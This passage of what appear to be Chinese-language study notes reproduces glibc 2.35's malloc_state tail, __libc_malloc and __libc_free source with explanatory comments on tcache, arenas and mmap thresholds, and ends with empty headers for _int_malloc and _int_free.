    INTERNAL_SIZE_T attached_threads;

    // 在此 arena 中从系统分配的内存
    INTERNAL_SIZE_T system_mem;
    // 此 arena 中从系统分配的内存的最大值
    INTERNAL_SIZE_T max_system_mem;
};

typedef struct malloc_state *mstate;
```

## __libc_malloc (glibc-2.35)

```C
void *
__libc_malloc(size_t bytes)
{
    mstate ar_ptr;  // 存储当前 arena 的状态
    void *victim;   // 存储分配的内存块的指针

    _Static_assert(PTRDIFF_MAX <= SIZE_MAX / 2,
                   "PTRDIFF_MAX is not more than half of SIZE_MAX");

    // 初始化malloc
    if (!__malloc_initialized)
        ptmalloc_init();
#if USE_TCACHE
    // 如果启用了 tcache（线程缓存），那么尝试从 tcache 中分配内存
    size_t tbytes;
    // 将请求的字节数转换为实际需要分配的字节数
    if (!checked_request2size(bytes, &tbytes))
    {
        __set_errno(ENOMEM);
        return NULL;
    }
    // 计算 tbytes 对应的 tcache 索引
    size_t tc_idx = csize2tidx(tbytes);

    // 如果 tcache 还没有初始化，那么就初始化它
    MAYBE_INIT_TCACHE();

    DIAG_PUSH_NEEDS_COMMENT;
    // 检查 tcache 是否有足够的空间来满足这个请求
    if (tc_idx < mp_.tcache_bins && tcache && tcache->counts[tc_idx] > 0)
    {
        // 从 tcache 中获取一个内存块
        victim = tcache_get(tc_idx);
        // 返回这个内存块的指针
        return tag_new_usable(victim);
    }
    DIAG_POP_NEEDS_COMMENT;
#endif

    // 如果是单线程，那么直接从 main_arena 中分配内存
    if (SINGLE_THREAD_P)
    {
        victim = tag_new_usable(_int_malloc(&main_arena, bytes));
        assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||
               &main_arena == arena_for_chunk(mem2chunk(victim)));
        return victim;
    }

    // 获取一个 arena
    arena_get(ar_ptr, bytes);

    // 从获取的 arena 中分配内存
    victim = _int_malloc(ar_ptr, bytes);
    // 如果分配失败，并且我们找到了一个可用的 arena，那么尝试从其他 arena 中重新分配
    if (!victim && ar_ptr != NULL)
    {
        LIBC_PROBE(memory_malloc_retry, 1, bytes);
        ar_ptr = arena_get_retry(ar_ptr, bytes);
        victim = _int_malloc(ar_ptr, bytes);
    }

    // 解锁 arena 的互斥锁
    if (ar_ptr != NULL)
        __libc_lock_unlock(ar_ptr->mutex);

    // 返回分配的内存块的指针
    victim = tag_new_usable(victim);

    assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||
           ar_ptr == arena_for_chunk(mem2chunk(victim)));
    return victim;
}
```

## __libc_free (glibc-2.35)

```C
void __libc_free(void *mem)
{
    mstate ar_ptr;  // 存储当前 arena 的状态
    mchunkptr p;    // 存储对应于 mem 的 chunk

    // free的mem不能为NULL
    if (mem == 0)
        return;

    if (__glibc_unlikely(mtag_enabled))
        *(volatile char *)mem;

    // 保存当前的 errno
    int err = errno;

    // 将 mem 转换为对应的 chunk
    p = mem2chunk(mem);

    // 如果 chunk 是通过 mmap 分配的，那么释放这个 chunk
    if (chunk_is_mmapped(p))
    {
        // 检查是否需要调整动态 brk/mmap 阈值
        // 如果 chunk 的大小大于当前的 mmap 阈值，并且小于或等于最大的 mmap 阈值，那么就调整阈值
        if (!mp_.no_dyn_threshold && chunksize_nomask(p) > mp_.mmap_threshold && chunksize_nomask(p) <= DEFAULT_MMAP_THRESHOLD_MAX)
        {
            // 将 mmap 阈值设置为 chunk 的大小
            mp_.mmap_threshold = chunksize(p);
            // 将 trim 阈值设置为 mmap 阈值的两倍
            mp_.trim_threshold = 2 * mp_.mmap_threshold;
            // 发送一个 probe，记录这次调整阈值的操作
            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2,
                       mp_.mmap_threshold, mp_.trim_threshold);
        }
        // 释放这个 chunk
        munmap_chunk(p);
    }
    else
    {
        // 如果 tcache 还没有初始化，那么就初始化它
        MAYBE_INIT_TCACHE();

        // 将 chunk 标记为属于库，而不是用户
        (void)tag_region(chunk2mem(p), memsize(p));

        // 获取 chunk 所在的 arena
        ar_ptr = arena_for_chunk(p);
        // 释放这个 chunk
        _int_free(ar_ptr, p, 0);
    }

    // 恢复 errno
    __set_errno(err);
}
```

## _int_malloc过程

## _int_free过程
